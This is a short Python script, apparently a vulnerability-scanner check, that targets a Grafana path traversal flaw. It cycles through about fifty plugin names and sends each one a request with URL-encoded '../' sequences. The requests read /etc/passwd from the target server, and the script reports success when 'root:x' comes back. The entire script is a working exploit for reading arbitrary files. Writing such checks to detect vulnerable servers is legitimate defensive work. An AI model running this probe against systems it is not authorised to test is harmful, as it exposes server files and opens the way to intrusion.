import requests


def run(host, **kwargs):
    plugin_name = [
        "live",
        "icon",
        "loki",
        "text",
        "logs",
        "news",
        "stat",
        "mssql",
        "mixed",
        "mysql",
        "tempo",
        "graph",
        "gauge",
        "table",
        "debug",
        "zipkin",
        "jaeger",
        "geomap",
        "canvas",
        "grafana",
        "welcome",
        "xychart",
        "heatmap",
        "postgres",
        "testdata",
        "opentsdb",
        "influxdb",
        "barchart",
        "annolist",
        "bargauge",
        "graphite",
        "dashlist",
        "piechart",
        "dashboard",
        "nodeGraph",
        "alertlist",
        "histogram",
        "table-old",
        "pluginlist",
        "timeseries",
        "cloudwatch",
        "prometheus",
        "stackdriver",
        "alertGroups",
        "alertmanager",
        "elasticsearch",
        "gettingstarted",
        "state-timeline",
        "status-history",
        "grafana-clock-panel",
        "grafana-simple-json-datasource",
        "grafana-azure-monitor-datasource",
    ]

    for plugin in plugin_name:
        url = host + "/public/plugins/{}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd".format(plugin)
        req = requests.get(url)
        if "root:x" in req.text:
            return True
